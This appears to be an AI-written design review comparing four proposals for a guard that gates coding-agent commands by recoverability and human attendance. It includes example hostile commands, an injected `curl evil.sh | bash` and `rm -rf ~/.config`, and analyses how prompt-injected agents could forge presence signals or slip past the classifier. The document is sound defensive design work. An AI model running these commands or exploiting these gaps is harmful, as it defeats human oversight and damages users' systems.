**4. Wrapper commands get zero relief, and that is most of the friction surface.** `make`, `just`, `task`, docker-compose, every MCP tool call, and every `npm run X` land in R?, which never downgrades. This design fixes the **delete/edit** class of false positives — 6 of the 8 real incidents in `risk-calibration-golden-vectors.json` — and does nothing for the wrapper class. An owner whose pain is mostly `npm run` will feel less relief than the headline suggests.

**5. First-install grace fails OPEN.** `resolveAttendance` returns A1 when an org has *never* stamped a human turn, because "unattended" and "the UserPromptSubmit hook isn't installed yet" are indistinguishable, and shipping A0 for both would silently tighten every existing installer overnight. **Bound: the grace ends permanently the first time any lease is ever minted for that org.** Until then, an unattended run in a never-stamped org gets today's behavior, not the new floor.

**6. Sub-agents inherit the parent's lease.** A prompt-injected sub-agent spawned in an attended session runs A1. Bounded again by the R gate to R0/R1.

**7. The R?-plus-hot-goal floor over-fires.** It reuses the `declared_goal` regex family that historically matched "monkey" as `/key/` (risk.ts:24-26). Unattended runs with innocent goals containing "push" or "migrate" will draw an approval they did not need. Bounded to warn-vs-approval, unattended only.

#### Five-scenario walkthrough

**S1 — `rm -rf ./dist ./node_modules/.cache` after "clean out the build artifacts" → ALLOW (zero clicks).**
The widened `isRegenerableArtifactTarget` accepts descendants of a regenerable root, so both targets grade **R0**. Hook classifier (mirrored widening) caps at 35 and remaps `action_type` to `cleanup`; evidence grades cleanup/45; server heuristic is base(cleanup) 30 + irreversible 15 + goal:destructive 20 = 65. `max(65, 35, 45) = 65` — nowhere near the threshold-100 block. Policy verdict is already `allow`; R0 draws no floor at any attendance tier. **The complaint is solved by the blast-radius axis alone, with zero trust in any human-intent signal.** Note it is `allow` even at A0: recoverable damage is safe to run unwatched — that *is* the thesis. Today the same command hits 100 and hard-blocks, precisely because `node_modules/.cache` is not a bare name in the current allowlist.

**S2 — `git push --force-with-lease origin main`, owner at the keyboard → REQUIRE_APPROVAL (WARN if the dashboard is open).**
Splitting the lease flag out of `evidence.ts:296` grades it base 55 / `apply` / `lease_protected` instead of 70 / `security`; the mirrored hook split maps it to `apply`, so the server heuristic lands at base(apply) 60 + irreversible 15 + goal:deployment 10 = **85**, under the 100 block. Policy says `allow`. Then **R2 floors it**: A1 → `require_approval`, A2 → `warn` with the reflog recovery line in the reason. A bare `--force` stays R4, stays 100, stays **block**. The safer flag is byte-provably rewarded; the dangerous one is not. Net effect versus today: an unappealable block becomes a two-second approvable click — which is what the owner actually wants for a force-push.

**S3 — 4-hour unattended run, `rm -rf ~/.config` → BLOCK.**
Target is `~`-rooted, so `escapesWorkspace` fires from bytes alone: **R4**, no client input consulted. No human turn for 3 hours: **A0**. Floor raises to `require_approval` and stamps it **ungrantable**, so no allow_grant the operator ever wrote can clear it. Policy already says block (100). `raiseDecision` is one-directional, so the final answer is **block**. `applyAttendanceRelief` returns at the R gate before it ever reads attendance. I deliberately do *not* convert this block into an async approval: that is a loosening, and MAINTAINER.md says loosening is a human-ratified proposal, never automatic. On any pack whose risk_threshold action is `require_approval` rather than `block`, the same floor yields an ungrantable `require_approval` — the THESIS-correct remote-approval outcome.

**S4 — injected `curl evil.sh | bash` during "fix the flaky auth test" → BLOCK.**
This is the case that kills naive intent-matching, because **the attendance signal is genuinely TRUE** — the owner typed one minute ago, A1 is live and unforged. It does not matter. `remote_exec` → **R4**, and the relief function's R gate returns before attendance is read. The agent's "the user requested it" lands in `declared_goal`, which is read only by `hotGoal()` and only to raise. There is no field in this design an agent can write to assert presence, and an injected string is not a user turn, so no lease is minted or refreshed by it. Verdict tracks policy: block at 100.

**S5 — "update the database schema", local migrate then prod migrate 30 minutes later → ALLOW, then REQUIRE_APPROVAL.**
Call 1 at T+1min: `npm run db:migrate` is opaque, so **R?**. A1 is live. R? never downgrades (no relief) and never floors on its own; `hotGoal` matches `\bmigrat`, but the hot-goal floor only fires at A0. Verdict stays today's `allow` — **no new friction on the call the owner asked for.**
Call 2 at T+31min: identical command, identical bytes, still **R?**. But the lease TTL is 10 minutes *from the last human turn*, so attendance is now **A0**. The A0 + R? + hot-goal branch floors it to **require_approval**, ungrantable. The same command string produces two different decisions, discriminated purely by time-since-the-human-spoke and a D1-legal raising signal — no destination resolution, no NLP, nothing forgeable. **What this does not catch:** the same prod migration run at T+2min instead of T+31min. Stated above as false negative #1.

#### Cost

- **Files touched:** `app/lib/guard/recovery.ts (NEW leaf module — classifyRecovery, foldRecoveryHints, worse; imports ./types only, so it sits at the same graph depth as evidence.ts)`, `app/lib/guard/evidence.ts (widen isRegenerableArtifactTarget:107 to descendants of a regenerable root with explicit `..` rejection; split --force-with-lease out of the vcs_dangerous branch:296 into base 55 / apply / flag lease_protected; expose the already-parsed `targets` and `kind` on EvidenceClassification so recovery.ts does not re-parse)`, `app/lib/guard/evaluate.ts (applyBlastRadiusFloor at the runCalibrationController slot ~:1044; applyAttendanceRelief between applyAllowGrants :1051 and applyOperatorApprovalGrant :1060; resolveAttendance helper; four new sibling fields on riskBreakdown)`, `app/lib/guard/types.ts (RecoveryClass / Attendance types; typed intel.recovery sub-object beside intel.bash and intel.file at :47-64)`, `app/lib/guard/caches.ts (ATTENDANCE_TTL_MINUTES + ATTENDANCE_RELIEF_ENABLED on the existing 30s-TTL settings cache, mirroring PREDICTIVE_RISK_ENABLED at :204)`, `app/lib/repositories/sessions.repository.js (stampHumanTurn, readAttendance — CLAUDE.md forbids direct SQL in route files)`, `app/api/sessions/[sessionId]/route.ts (accept human_turn:true in the existing PATCH body at :28-40 — no new route)`, `app/lib/auth (existing NextAuth session-resolution path: stamp orgs.operator_seen_at — this is the A2 mint and the reason A2 is unforgeable by an API key)`, `schema/schema.js + drizzle/00XX_attendance.sql (agent_sessions.human_turn_at at :1411; orgs.operator_seen_at — two nullable timestamptz columns, no new tables)`, `app/lib/repositories/settings.repository.js (two keys added to VALID_SETTING_KEYS at :109-110)`, `hooks/dashclaw_userprompt.py (NEW, ~60 lines: PATCH the session with human_turn plus a prompt SHA-256; NEVER the prompt text)`, `hooks/settings.json + plugins/dashclaw/hooks/hooks.json (register UserPromptSubmit — the fifth wired event; installed hooks are COPIES, so this needs install-hooks --global + a session restart, which is exactly why the first-install grace exists)`, `hooks/dashclaw_agent_intel/bash_classifier.py (mirror both evidence.ts widenings — the two files are documented mirrors at evidence.ts:52-56 and drift silently if only one moves)`, `hooks/dashclaw_pretool.py (attach intel.recovery {repo, dirty} in _build_guard_context :1631-1656, alongside the existing _attach_client_capabilities pattern at :1029-1050)`, `app/policies/components/PostureHero.tsx (attendance strip + relief toggle + TTL select, under the existing friction sentence at :147-151)`, `app/approvals/page.tsx (one 'why you're seeing this' line per held item: the A tier and the R class with its recovery procedure)`, `app/decisions (render recovery_class + recovery_why + attendance_tier from the persisted breakdown)`, `__tests__/fixtures/risk-calibration-golden-vectors.json (pin all 8 known real-session false positives plus the five scenarios; --force vs --force-with-lease as a paired vector)`, `docs/architecture/trust-and-failure-model.md (add D1-prime: the recovery axis's demote-only monotonicity rule, as a sibling to D1)`, `THESIS.md + CHANGELOG.md + docs/maintainer-log.md (MAINTAINER.md requires a log + CHANGELOG + Release per ship)`
- **Surface budget:** **Zero against every ceiling.**

- **Guard policy types: 0 of 16 consumed.** Both passes are builtins inside `evaluate.ts`, exactly like `builtin:operator_approval` and `builtin:containment_promote`. `KNOWN_POLICY_TYPES` / `POLICY_EVALUATORS` are untouched, so `npm run surface:check` sees no change and no THESIS.md amendment is required.
- **API routes: 0 of 131.** The A1 mint rides the existing `PATCH /api/sessions/[sessionId]` (route.ts:28) with one new accepted body field. The A2 mint rides the existing NextAuth session-auth path and adds no endpoint. `discoverApiRoutes()` count is unchanged.
- **App pages: 0 of 53.** Everything renders inside `PostureHero.tsx`, `app/approvals/page.tsx`, and the decisions ledger — all existing.
- **MCP tools 0/17, MCP resources 0/3, Node SDK 0/39, Python SDK 0/59, CLI commands 0/14.** Nothing in this design is agent-facing, so nothing needs an SDK or MCP surface. That is not an accident: an agent-callable "I am attended" method would be precisely the forgery surface the design exists to avoid.

**What it does add that the budget does not count:** one new server module (`app/lib/guard/recovery.ts`), one new hook script (`hooks/dashclaw_userprompt.py`), one new wired hook event (UserPromptSubmit — the fifth, alongside PreToolUse/PostToolUse/Stop/SessionStart), two nullable columns, and two settings keys. The hook event is the only genuinely new *integration* surface, and it needs Codex and Hermes parity work later (`PLUGIN_PARITY.md`): Codex has no UserPromptSubmit-equivalent, so Codex installs sit permanently at A0 and get only the floor, never the relief. That is a real, stated cross-runtime asymmetry, not a hidden one.
- **Human surface:** **Primary surface: `/policies` → PostureHero, the top card, above the fold.**

Click path: existing nav → **Policies**. `PostureHero.tsx:147-151` already renders a friction strip ("This policy set interrupted your agents **N** times in the last 7 days"). I add one sibling strip directly beneath it, so the two numbers read as a pair — how often it interrupted you, and how often it correctly *didn't*:

> **Attended** · you were in the dashboard 2 minutes ago · relief expires in 8 min
> **14 interruptions skipped** in the last 7 days because the damage was recoverable. **[Show them]**
> ☑ Relax interruptions while I'm here · window: [5 / **10** / 30 min ▾]

Three controls, all of them clicks in a component that already exists: the toggle (kills all relief, floors stay), the TTL select (how fast attendance decays), and **[Show them]** which filters the existing Ledger to `matched_policies contains builtin:attendance_relief`. The live badge is what makes the whole thing debuggable — the first question anyone asks is "why did it interrupt me *that* time," and the strip answers it without a terminal.

**Second surface: `/approvals` — the hero queue.** Every held item gains one plain-language line under its title:

> Held because: **unattended** (last human turn 34 min ago) + **no recovery path** (deletes outside the workspace).

That single line teaches both axes from the place the owner already stands, and it is where he learns that the fix for "stop asking me" is either "be here" or "make it recoverable" — not "turn it off."

**Third surface: `/decisions`** renders `recovery_class` and the recovery procedure string on each row, so *"how would I have gotten this back"* is auditable after the fact, not just at the moment of the prompt.

**Zero-terminal test:** the human's entire role is (a) reading the attendance badge, (b) flipping one toggle, (c) picking a TTL from a select, (d) clicking Approve/Deny on a queue item. Terminal commands required: **zero**. GitHub visits: **zero**. The one install-time terminal step (`install-hooks --global` to pick up the new UserPromptSubmit registration) is a dev act, and it is already the documented path for every hook change in this repo.
- **Why it beats the obvious:** **Lowering the thresholds is a global trade; this is a conditional one.** A threshold knob has exactly one position. Move it down and you buy quiet by surrendering the catastrophe case *uniformly* — the overnight `rm -rf ~/.config` gets the same discount as the daytime `rm -rf ./dist`. Move it up and you get the reference deployment's actual outcome: all policies off for 18 days. The knob cannot express "quieter when I'm here, stricter when I'm not," and that sentence is the entire product.

**This design moves in both directions at once, which no single dial can.** S1 goes from block to allow. S3's floor goes from nothing to an ungrantable `require_approval` on top of the existing block. S5's second call goes from allow to require_approval on the *same command string* as its first call. A threshold change cannot produce that pattern at any setting.

**Turning policies off deletes the catastrophe case; this design never touches it.** R4 is untouched at every attendance tier, `block` is never written over, and the relief function's R gate is read before the A gate so an irrecoverable act never even consults attendance. The maximum yield of a *complete* compromise of every client-authored signal here is the authority to delete regenerable build artifacts and edit git-tracked files — both already `allow`/`warn` today. Net new authority granted to an attacker: zero. No threshold change can make that claim, because a lower threshold grants exactly the same discount to the attacker as to the owner.

**It attacks the right variable.** Recon established that in both shipped packs the actual gating variable is a *categorical* `action_type` match, not the numeric score — so tuning the arithmetic would not have touched the friction source at all. And 6 of the 8 documented real-session false positives are the delete/edit class: `rm -rf .next`, a single-file `Remove-Item`, an empty-dir `rmdir`, a correctly non-recursive delete. Those are not scoring-precision failures. They are the system failing to ask *"could I get this back?"* — a question it currently never asks anywhere, at any threshold.

**And it is the only version of this that makes the unattended case stricter.** Every relief mechanism already shipped (allow_grant, operator_approval, plan grants, loosening proposals) is retrospective or pre-declared, and every one of them is a pure loosening. This is the first mechanism in the codebase that pays for its relief by *adding* governance where the product's own thesis says governance is actually needed.

#### Failure modes

- FIRST-INSTALL FAIL-OPEN. 'Unattended' and 'the UserPromptSubmit hook was never installed' are indistinguishable, so resolveAttendance returns A1 for an org that has never stamped a human turn. Shipping A0 for both would silently tighten every existing installer the moment they pull — the exact regression that produced the 18-day-policies-off incident. The grace ends permanently on the first lease ever minted. This is a deliberate, bounded, recorded fail-open and it is the one place the design does not fail closed.
- CLOCK SKEW makes every lease look expired -> permanent A0 -> the owner gets zero relief and concludes the feature is broken. Direction is safe (stricter), diagnosability is the problem; the PostureHero live badge showing the tier AND the age is the mitigation, and it is why the badge is not optional chrome.
- HOT-PATH LATENCY. Two extra reads per guard call (orgs + agent_sessions). They must ride the existing 30s cache layer in caches.ts or this regresses the guard hot path that v4.73.0 was specifically opened to fix. A cache miss on a cold instance costs one extra round trip; resolveAttendance must be inside the existing deadline race, and a deadline overrun must resolve to A0.
- THE MIRROR DRIFTS. bash_classifier.py and evidence.ts are documented mirrors (evidence.ts:52-56). Widening the regenerable set in only one produces a client score of 35 and a server score of 80, and max() makes the server's stale number the final answer — the exact shape of the blunt-70 bug the golden-vector corpus already records. Both widenings must land in one commit with a paired golden vector.
- PATH-NORMALIZATION BUG IN THE R0 WIDENING. Accepting descendants of a regenerable root is where a real exploit would live: `node_modules/../../..` must not pass. The prefix test has to normalize and reject `..` and absolute forms BEFORE the comparison, not after — the existing code only rejects globs.
- SUB-AGENT LEASE INHERITANCE. The lease is keyed on harness_session_id, which a sub-agent shares. A prompt-injected sub-agent therefore runs A1. Bounded by the R gate to R0/R1, but it means attendance is a property of the session, not of the actor inside it.
- R? + HOT-GOAL OVER-FIRE. The floor's raise reuses the declared_goal regex family that historically matched 'monkey' as /key/ and 'pushback' as /push/ (risk.ts:24-26). Unattended overnight runs with innocent goal text will draw approvals nobody needs, and an unattended run is exactly when nobody is there to clear them — the queue backs up until morning.
- CODEX AND DESKTOP HAVE NO A1 AT ALL. Codex's installer writes only four hook events (cli/lib/codex/install.js:219-280) and Claude Desktop cannot run local hooks. Both sit permanently at A0: they receive the tightening floor and never the relief. Shipping the floor before the Codex parity work makes Codex installs strictly noisier, which is a rollout-ordering hazard, not a design flaw.
- SCORING CHANGES ARE NOT DECISION DOWNGRADES, BUT THEY LOOK LIKE ONE. Splitting --force-with-lease (100 -> 85) and widening R0 both lower persisted risk_scores. A reviewer scanning the diff will read that as auto-loosening, which MAINTAINER.md forbids. It is a build-time classifier change under human review with pinned golden vectors, not a runtime relaxation — and it must be argued that way in the maintainer log or it will read as a constitutional violation.

---

## Phase 3 — Judge verdicts

### Judge: SHIPABILITY — can this be built on existing tested seams, pinned by existing harnesses, and landed as a coherent change with a real slice 1?

**Ranking (best first):** Precedent — learned allow-grants mined from adjudicated approvals > Task Envelope Authorization (Reach-Bounded Envelopes) > Intent Warrants — server-signed attribution receipts that narrow, never widen > Floor & Ceiling — Blast-Radius Floor, Attendance Ceiling

| Candidate | Score | Reasoning |
|---|---|---|
| Precedent — learned allow-grants mined from adjudicated approvals | 9/10 | Every seam claim checked out in source, and it is the only candidate that needs ZERO hook changes and ZERO migrations. SEAM FIT: adds no new post-pass at all — it extends grantMatches (a pure function with its own policy-shapes.test.ts), adds one field to EvidenceDerivedBreakdown, stops discarding evidence.flags in foldEvidenceIntoContext, and adds a rule to the existing loosening engine whose mining query it near-copies (I confirmed getInterruptOutcomesByPolicyAction already carries the ::timestamptz cast that handles the fresh-vs-legacy TEXT drift and the syntheticExclusionSql filter). HOOK DISTRIBUTION: none. No install-hooks --global, no session restart, no bundles:refresh, no drill:fresh-windows trigger. Unique among the four and worth several points on this lens alone. MIGRATION: zero — flags ride the additive _risk_breakdown jsonb pattern the codebase endorses in its own comment at evaluate.ts:741-743, precedent_flags rides guard_policies.rules JSON. TESTABILITY: best of the set and multi-layered — the isRegenerableArtifactTarget fix is directly pinnable by the existing two-sided golden corpus (JS computeRiskScore + the Python classify_bash mirror in hooks/tests/test_risk_calibration_golden.py), the eligibility allowlist and grantMatches predicate are pure functions you can write a failing test for first, and the hostile-input test (validate() strips evidence_flags) is a one-liner. BLAST RADIUS: lowest — never touches app/api/guard/route.ts (the 1.0/10 file), touches evaluate.ts in exactly one function additively, and the grantMatches extension is a structural no-op when the field is absent so the 42 evaluateGuard test files and 10 policy-shapes consumers stay green by construction. INCREMENTALITY: outstanding — slice 1 is ~4 lines in isRegenerableArtifactTarget plus two golden vectors, and it alone converts the owner's headline S1 case from block-at-100 to allow with no new concepts introduced. Slice 2 persists flags. Slice 3 is the loop. Each is independently valuable and revertable. Deductions: its 'why v4.74.0 failed' diagnosis is factually wrong (app/calibration/page.jsx renders a full off/shadow/active toggle behind /api/calibration/controller), and its own admitted FN-1 means the learning loop may never fire on the owner's instance — but slice 1 ships the complained-about value regardless of the loop, which is exactly what this lens rewards. |
| Task Envelope Authorization (Reach-Bounded Envelopes) | 6/10 | Technically the cleanest of the three hook-dependent designs, and its restraint claims verified better than the others'. SEAM FIT: strong — the post-pass is a structural twin of applyOperatorApprovalGrant, and I confirmed its two sharpest composition claims are correct: applyPlanStepGrant's deny branch only early-returns on 'block' (so an operator DENY still outranks an envelope-downgraded allow), and harness_session_id already reaches context via the index signature (containment.ts:115 uses it), so it genuinely needs no GuardEvalContext field, no validate.js change, no risk.ts change, no policy.ts change. Adding POST to the existing app/api/sessions/[sessionId]/events/route.ts is truly +0 against the 131/131 ceiling because countApiRoutes counts files. It also never touches the 1.0/10 guard route. HOOK DISTRIBUTION: this is where it loses points. UserPromptSubmit means a new script plus hooks/settings.json plus the generated plugin mirror plus the HOOK_EVENTS map at cli/lib/claude/install.js:200 plus cli/test/claude/install.test.js plus scripts/install-hooks.mjs plus README/PARITY plus regenerated download bundles — and touching cli/** fires npm run drill:fresh-windows (a Windows Sandbox drill) per CLAUDE.md v8.3. It handles this better than its rivals: the /setup readiness line and the explicit 'prompt hook not detected' empty state make the half-installed state diagnosable rather than a silent no-op, which is the single most valuable mitigation any candidate offers here. MIGRATION: one new table plus a repository — routine against 71 existing drizzle migrations, but it needs the reaper it honestly names or the table walls. TESTABILITY: computeReach is pure and synchronous, ideal for TDD, and it proposes its own vector fixture in the existing corpus style. But the actual product claim (silence during a live session) is only provable end-to-end after install plus session restart — no existing harness reaches it. INCREMENTALITY: the real weakness. Hook, mint, table, post-pass and strip are one interlocked mechanism; there is no partial slice that delivers value, so the whole distribution cost is paid up front before the first measurement. |
| Intent Warrants — server-signed attribution receipts that narrow, never widen | 4/10 | The most simultaneous new machinery of the four, landing on the repo's most fragile file. SEAM FIT: the post-pass placement is fine, but the ?mint=intent branch goes into app/api/guard/route.ts — the repo's worst-health file at 1.0/10 — and must early-return before the existing rate limiter, validateGuardInput and evaluation flow inside a 200-line POST handler. The ?record=true precedent is real (verified at route.ts:404), but that is a flag read INSIDE the normal flow, not a whole alternate handler, so the precedent is weaker than claimed. On top of that it needs a new intent.ts doing HKDF plus HMAC plus prose parsing plus grading, a validate.js whitelist entry, types.ts, caches.ts, three settings keys, a session_events write path, and a YAML change to catastrophe-only/policies.yml which has its own dedicated test file. HOOK DISTRIBUTION: worst of the four. It pays the full 5th-event cost (same 8-10 files plus the drill:fresh-windows trigger as D) AND separately changes _build_guard_context AND changes _enrich_file's hardcoded reversible:True in the 82K pretool hook — a behavior change to an existing hot path covered by the large existing pretool test suite. Two hook-side behavior changes, both requiring reinstall plus restart. MIGRATION: no schema, but the mint persists the human's literal typed prompt, which the candidate itself flags as a secret-exfiltration path requiring scanSensitiveData — that is correctness-critical plumbing, not a nicety. TESTABILITY: the grading function is pure and pinnable, but the load-bearing piece is deriveIntentEnvelope, a prose-to-action_type synonym mapper. No existing harness covers it (the golden corpus tests computeRiskScore, not envelope derivation), and 'does the mapper understand what the human meant' is not a proposition you can write a satisfying failing test for. The candidate concedes it is 'the most likely thing to rot.' BLAST RADIUS: highest — guard-route surgery, catastrophe-pack YAML change, pretool behavior change, plus new latency on every prompt submit that it admits will get the feature uninstalled within a day if it ever blocks. INCREMENTALITY: poor — mint, hook, module, post-pass and ceiling setting all required before anything works; the _enrich_file fix is separable but that is a bug fix, not a slice of this design. |
| Floor & Ceiling — Blast-Radius Floor, Attendance Ceiling | 3/10 | The most reviewable-in-theory design and the least landable in practice. SEAM FIT: worst of the four — it is the only candidate adding TWO passes to evaluate.ts (a raise-only floor at the calibration slot and a lower-only ceiling at the grants slot) in one change, so the diff simultaneously loosens and tightens the decision engine. It also modifies evidence.ts classifier branches: widening isRegenerableArtifactTarget AND splitting --force-with-lease out of the shared regex I verified at line 296. Both changes must be MIRRORED in hooks/dashclaw_agent_intel/bash_classifier.py under a two-sided CI contract (JS computeRiskScore + Python classify_bash over one shared fixture), and I confirmed no force-with-lease vector exists today, so new paired vectors are required on both sides. It further touches the NextAuth session-resolution path to stamp operator_seen_at — an auth-path change, which sits on CLAUDE.md's ask-first list. HOOK DISTRIBUTION: bad and triple-sited — UserPromptSubmit (full 8-10 file cost plus the drill:fresh-windows trigger), plus an intel.recovery attachment in dashclaw_pretool.py, plus the bash_classifier.py mirror. MIGRATION: two nullable columns across two tables — routine on its own, but it compounds the deploy sequencing. TESTABILITY: classifyRecovery is pure and the classifier changes ARE pinnable by the golden corpus, which is genuinely good. But the attendance half needs DB state, clock control and a live hook, and its most consequential behavior — the first-install fail-OPEN grace — is a deliberate exception to the repo's fail-closed norm that a reviewer will contest on constitutional grounds. BLAST RADIUS: very high. Changing isRegenerableArtifactTarget and the vcs regex moves persisted risk scores for existing traffic (guard-evidence.test.js is 27K, guard-engine.test.js is 23K; both shift), and the candidate itself predicts a reviewer will read the diff as auto-loosening in violation of MAINTAINER.md. Worse, the floor ADDS interruptions on every A0 evaluation, so shipping it regresses every existing installer the moment they pull — and it concedes shipping the floor before Codex parity makes Codex installs strictly noisier, a stated rollout-ordering hazard. INCREMENTALITY: only partial. The classifier calibration half (regenerable widening plus the lease split) is a genuinely good standalone slice, but the floor/ceiling machinery it exists to serve is one interlocked unit with no independently shippable piece. |

**Fatal flaws**

- [Intent Warrants — server-signed attribution receipts that narrow, never widen] LOAD-BEARING — The load-bearing component, deriveIntentEnvelope (prose to action_type), cannot be pinned by any existing harness. The golden corpus tests computeRiskScore over a server_context, not envelope derivation, so 'did the mapper correctly read what the human meant' has no failing test you can write first. The candidate concedes it is 'the most likely thing to rot' and that vocabulary misses leave the owner still clicking. A design whose central mechanism is untestable by construction cannot be verified or measured after it ships, which is the whole point of this lens. Secondary, and fixable: the ?mint=intent branch performs surgery on app/api/guard/route.ts, the repo's worst-health file (1.0/10), early-returning before the rate limiter and validateGuardInput inside a 200-line handler covered by 42 evaluateGuard test files.
- [Floor & Ceiling — Blast-Radius Floor, Attendance Ceiling] FIXABLE — It bundles four separately-contentious changes into one indivisible ship: a raise-only floor pass, a lower-only ceiling pass, mirrored classifier edits across evidence.ts and bash_classifier.py under a two-sided CI fixture contract, and an auth-path change to stamp operator_seen_at. The floor ADDS interruptions for every A0 evaluation, so the change regresses every existing installer on pull, and its mitigation is a deliberate first-install fail-OPEN that inverts the repo's fail-closed norm. The candidate itself predicts the diff will read as auto-loosening in violation of MAINTAINER.md. Fixable by splitting into two ships: land the classifier calibration slice alone first (regenerable-subtree widening plus the --force-with-lease split, both pinnable by the existing golden corpus on both the JS and Python sides), and defer the floor/ceiling machinery behind it.
- [Task Envelope Authorization (Reach-Bounded Envelopes)] LOAD-BEARING — No slice 1. The hook, the mint endpoint, the task_envelopes table, the post-pass and the /approvals strip are one interlocked mechanism — none of them delivers measurable value alone, so the entire distribution cost is paid before the first data point. That cost is real: the 5th hook event touches ~8-10 files including the HOOK_EVENTS map at cli/lib/claude/install.js:200 and its CLI test, and because it modifies cli/** it fires npm run drill:fresh-windows (a Windows Sandbox drill) under CLAUDE.md's v8.3 entry-path rule. Not fixable without changing the design, since out-of-band presence capture IS the mechanism. One component is separable and worth extracting regardless: computeReach ships alone as a pure function with its own vector fixture.
- [Precedent — learned allow-grants mined from adjudicated approvals] FIXABLE — Its diagnostic argument contains a verified factual error: it claims the v4.74.0 calibration controller is off by default and unreachable because 'no page renders a toggle for it' and 'the only activation is a raw PATCH with an internal key name.' In fact app/calibration/page.jsx renders a full off/shadow/active segmented control with a two-step confirm on active, backed by the admin-gated /api/calibration/controller route. The design does not depend on this claim (its mechanism is orthogonal), so it is a rhetoric error, not a build blocker — but it means one of the three pillars of its 'why the last fix failed' story needs rewriting before the ADR and maintainer-log entry go in. Separately, its own admitted FN-1 (the mining loop may never fire on the owner's instance, which has 0 recorded approvals) means the learning half may ship and produce nothing; the mitigation is that slice 1 (the isRegenerableArtifactTarget fix) delivers the headline complaint independently of the loop.

**Best idea to graft:** Candidate D's `computeReach()` — a pure, synchronous, server-side function over the act bytes returning a coarse reach class (R0_WORKSPACE / R1_MACHINE / R2_SHARED / R_UNKNOWN) where R_UNKNOWN fails closed. On this lens it is the single most shippable idea in the whole set: no hook, no migration, no DB read, no client-supplied field, no evaluate.ts surgery, and it is directly pinnable by a vector fixture in the existing two-sided golden-corpus style (its inputs are exactly what classifyAct already consumes). Graft it into Precedent's eligibility gate. Precedent currently gates on a hand-maintained string allowlist keyed on `action_type|sorted-flags` with exact set equality — and it admits that gate silently disarms every ratified precedent the moment a future evidence.ts change adds a flag to a common shape, with interruptions returning and no explanation. Requiring `computeReach(context) === 'R0_WORKSPACE'` as a second, independent condition alongside the allowlist gives the same fail-closed property with far better churn tolerance, and it hands Precedent the target-scope check it structurally lacks today (its `target_prefix` is optional, so a mined grant with no prefix covers any path). Both halves are pure functions, so the combined gate is still fully unit-testable with a failing test written first, and it costs zero additional hook, migration, or route surface.

**Verdict:** Precedent wins this lens decisively, and the margin is mostly structural rather than clever. It is the only candidate that needs no hook change, and I verified why that matters concretely: a 5th hook event touches ~8-10 files including the HOOK_EVENTS map at cli/lib/claude/install.js:200 and its CLI test, and because it modifies cli/** it triggers npm run drill:fresh-windows — a Windows Sandbox drill — under CLAUDE.md's v8.3 entry-path rule. Three of four candidates pay that toll before landing a single line of governance behavior. Precedent also needs no migration (the additive _risk_breakdown jsonb pattern is endorsed in the codebase's own comment), never touches the 1.0/10 guard route, adds no new post-pass at all, and its mining query is a near-copy of an already-tested one that carries the ::timestamptz cast handling the fresh-vs-legacy TEXT drift. Every seam claim it made checked out in source. Most importantly it has the only genuine slice 1: roughly four lines in isRegenerableArtifactTarget plus two golden vectors, pinnable by the existing two-sided JS/Python corpus, converting the owner's headline case from block-at-100 to allow with zero new concepts. That slice can ship this week, be measured, and be reverted cleanly if wrong — which is worth more on this lens than any amount of architectural elegance behind a Windows Sandbox drill. Task Envelope is the best-engineered of the hook-dependent three and handles the copy-distribution problem most honestly (the /setup readiness line and explicit empty state make the half-installed failure diagnosable instead of silent), but it has no partial slice. Intent Warrants concentrates the most new machinery on the most fragile file and its central prose-to-envelope mapper is untestable by construction. Floor & Ceiling is the least landable: four contentious changes fused into one diff that adds interruptions on pull and whose own author predicts a reviewer will read it as constitutional auto-loosening. The synthesizer should ship Precedent's slice 1 first and independently, then graft D's computeReach as a second fail-closed gate on Precedent's eligibility — both are pure functions, both cost zero hook and zero migration, and together they close Precedent's flag-set-churn brittleness and its missing target-scope check.

---

### Judge: EFFICACY — precision of interruption. Does the design actually kill the owner's false interruptions (safe actions he just asked for) WITHOUT killing the true ones (S3 unattended catastrophe, S5 scope creep)? Plus latency cost on the guard hot path. Verified against the running classifier, not the candidates' prose.

**Ranking (best first):** Floor & Ceiling — Blast-Radius Floor, Attendance Ceiling > Precedent — learned allow-grants mined from adjudicated approvals > Task Envelope Authorization (Reach-Bounded Envelopes) > Intent Warrants — server-signed attribution receipts that narrow, never widen

| Candidate | Score | Reasoning |
|---|---|---|
| Floor & Ceiling — Blast-Radius Floor, Attendance Ceiling | 9/10 | FALSE INTERRUPTIONS: the only candidate that actually kills the measured defect. I ran the shipped classifier: `rm -rf ./dist ./node_modules/.cache` returns 100 — identical to `rm -rf ~/.config` — and hard-BLOCKS under the owner's default pack. C2 is the ONLY candidate whose file list mirrors the regenerable-subtree widening into BOTH `evidence.ts` and `hooks/dashclaw_agent_intel/bash_classifier.py`, and it names mirror-drift as a failure mode. Without the client half, max() (D1) makes the client's 100 final — which is exactly why C1 and C3's S1 walkthroughs are arithmetically false. C2's S1 → allow at EVERY attendance tier, i.e. it does not even spend the trust mechanism on the headline case. Second verified win: `--force` and `--force-with-lease` both return 100 today; splitting the lease flag (byte-proof reflog recoverability) converts an unappealable block into a two-second approvable click. TRUE INTERRUPTIONS: this is where it separates decisively. S3 gets STRICTER — an ungrantable require_approval floor stacked on top of the existing block, and the relief function reads the R gate BEFORE the A gate so a genuinely-true attendance signal is never consulted for anything irrecoverable (the correct architectural ordering, and the reason S4 dies even though the human really did just type). S5 is the only correct answer in the field: call 1 (local migrate, T+1min) allow — no new friction on what he asked for — and call 2 (prod, T+31min) require_approval, from the SAME command bytes, discriminated purely by time-since-human via a D1-legal raising signal. I verified `\bmigrat` is in DEPLOYMENT_GOAL_PATTERNS so the hot-goal floor genuinely fires. Every other candidate either allows both (unsafe) or refuses both (safe but zero precision gained). Net new authority under total client-signal compromise is ~0: forged A1 buys R0/R1 only, and I confirmed those are already allow/warn today. LATENCY: worst of the four — two new reads/call (orgs + agent_sessions) on EVERY call, not just interrupts. Cacheable at the existing 30s TTL against a 10-min attendance TTL, so ~1 extra round trip per session per 30s, inside the 3500ms deadline — but it is a real regression on the path v4.73.0 was opened to optimize, and per-session cache cardinality is unbounded (unmentioned). Costs a point. Also genuinely ADDS false interruptions: the R?+hotGoal floor reuses the goal-regex family and will draw overnight approvals nobody clears until morning. |
